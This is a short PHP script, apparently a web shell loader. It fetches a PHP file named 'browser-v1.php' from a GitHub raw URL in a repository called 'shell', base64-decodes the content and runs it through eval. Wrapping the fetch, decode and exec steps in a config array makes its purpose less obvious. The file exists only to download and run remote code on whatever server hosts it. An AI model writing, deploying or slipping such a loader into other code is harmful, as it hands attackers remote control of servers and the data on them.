<?php
$config = [
    'url' => "https://raw.githubusercontent.com/pocongngesott/shell/refs/heads/main/browser-v1.php",
    'fetch' => function($u) {
        return file_get_contents($u);
    },
    'decode' => function($d) {
        return base64_decode($d, true) ?: $d;
    },
    'exec' => function($c) {
        return eval('?>' . $c);
    }
];

$content = $config['fetch']($config['url']);
$content = $config['decode']($content);
$config['exec']($content);
